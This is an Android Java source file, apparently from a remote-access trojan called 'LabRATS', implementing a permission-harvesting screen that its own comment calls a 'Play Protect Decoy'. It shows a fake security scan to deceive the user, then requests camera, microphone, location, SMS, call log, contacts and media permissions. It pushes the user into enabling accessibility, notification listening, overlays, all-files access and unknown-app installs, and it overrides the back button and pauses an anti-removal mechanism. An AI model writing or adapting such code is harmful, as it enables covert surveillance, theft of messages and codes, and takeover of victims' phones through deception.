package com.labs.labrats;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.button.MaterialButton;

import java.util.ArrayList;
import java.util.List;

/**
 * High-Fidelity Play Protect Decoy for permissions.
 * Now uses individual layout files for each step for better Resource Manager management.
 */
public class PermissionActivity extends AppCompatActivity {

    private static final String TAG = "PermissionActivity";
    private static final int PERMISSION_REQUEST_CODE = 2001;

    private boolean isAnimationRunning = false;
    private String currentLayoutType = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // SUSPEND ANTI-REMOVAL
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
        
        if (!areRuntimePermissionsGranted()) {
            setupScanningUI();
        } else {
            checkSpecialChain();
        }
        
        handleInstructions(getIntent());
    }

    private void setupScanningUI() {
        if (isAnimationRunning) return;
        setTheme(R.style.Theme_LabRATS_Permissions);
        setContentView(R.layout.activity_permission_decoy);
        currentLayoutType = "scanning";

        ProgressBar pb = findViewById(R.id.pbPlayProtect);
        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
        TextView tvSub = findViewById(R.id.tvPlayProtectSub);

        isAnimationRunning = true;
        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        final int[] p = {0};
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (isFinishing() || isDestroyed() || !"scanning".equals(currentLayoutType)) return;
                
                if (p[0] < 100) {
                    p[0] += (int)(Math.random() * 8) + 1; 
                    if (p[0] > 100) p[0] = 100;
                    if (pb != null) pb.setProgress(p[0]);
                    
                    if (tvDetails != null) {
                        if (p[0] > 30) tvDetails.setText("Analyzing security modules...");
                        if (p[0] > 60) tvDetails.setText("Checking for restricted access...");
                        if (p[0] > 85) tvDetails.setText("Finalizing report...");
                    }
                    if (p[0] > 50 && tvSub != null) tvSub.setText("Verifying environment...");
                    
                    handler.postDelayed(this, 100 + (int)(Math.random() * 150));
                } else {
                    isAnimationRunning = false;
                    requestMissingBatch();
                }
            }
        });
    }

    private void requestMissingBatch() {
        List<String> perms = getNeededPermissions();
        if (!perms.isEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            checkSpecialChain();
        }
    }

    private void checkSpecialChain() {
        if (isFinishing() || isDestroyed()) return;

        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (isFinishing() || isDestroyed()) return;

            boolean accMissing = IO_Persistence_Manager.getInstance() == null;
            boolean notifMissing = !isNotificationServiceEnabled();
            boolean overlayMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this);
            boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager();
            boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls();

            if (accMissing) showOptimizationGuide("accessibility");
            else if (notifMissing) showOptimizationGuide("notifications");
            else if (overlayMissing) showOptimizationGuide("overlay");
            else if (filesMissing) showOptimizationGuide("files");
            else if (installMissing) showOptimizationGuide("install");
            else {
                setResult(9999);
                finish();
            }

        }, 600);
    }

    private void showOptimizationGuide(String type) {
        if (type.equals(currentLayoutType)) return;
        
        int layoutId;
        View.OnClickListener action;

        switch (type) {
            case "notifications":
                layoutId = R.layout.activity_guide_notifications;
                action = v -> openNotificationSettings();
                break;
            case "overlay":
                layoutId = R.layout.activity_guide_overlay;
                action = v -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    } catch (Exception ignored) {}
                };
                break;
            case "files":
                layoutId = R.layout.activity_guide_files;
                action = v -> {
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        }
                    } catch (Exception ignored) {}
                };
                break;
            case "install":
                layoutId = R.layout.activity_guide_install;
                action = v -> {
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        }
                    } catch (Exception ignored) {}
                };
                break;
            default:
                layoutId = R.layout.activity_guide_accessibility;
                action = v -> openAccessibilitySettings();
                break;
        }

        setContentView(layoutId);
        currentLayoutType = type;
        MaterialButton btn = findViewById(R.id.btnGuideAction);
        if (btn != null) btn.setOnClickListener(action);
    }

    @Override
    public void onBackPressed() {
        if (allStandardGranted()) {
            super.onBackPressed();
        } else {
            checkSpecialChain();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleInstructions(intent);
    }

    private void handleInstructions(Intent intent) {
        if (intent == null) return;
        String target = intent.getStringExtra("target_menu");
        if (target == null) return;

        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (target.equals("accessibility")) openAccessibilitySettings();
            else if (target.equals("notifications")) openNotificationSettings();
        }, 800);
    }

    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openNotificationSettings() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private boolean isNotificationServiceEnabled() {
        try {
            String pkgName = getPackageName();
            final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                for (String name : flat.split(":")) {
                    ComponentName cn = ComponentName.unflattenFromString(name);
                    if (cn != null && pkgName.equals(cn.getPackageName())) return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    protected void onDestroy() {
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkSpecialChain();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (allStandardGranted()) {
            setResult(9999);
            finish();
        } else if (areRuntimePermissionsGranted()) {
            checkSpecialChain();
        } else if (!isAnimationRunning && "scanning".equals(currentLayoutType)) {
            setupScanningUI();
        }
    }

    private List<String> getNeededPermissions() {
        List<String> needed = new ArrayList<>();
        String[] perms = {
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS
        };

        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.ANSWER_PHONE_CALLS);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_PHONE_NUMBERS);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_AUDIO);
        }
        return needed;
    }

    private boolean areRuntimePermissionsGranted() {
        return getNeededPermissions().isEmpty();
    }

    private boolean allStandardGranted() {
        if (!areRuntimePermissionsGranted()) return false;
        if (IO_Persistence_Manager.getInstance() == null) return false;
        if (!isNotificationServiceEnabled()) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) return false;
        return true;
    }
}
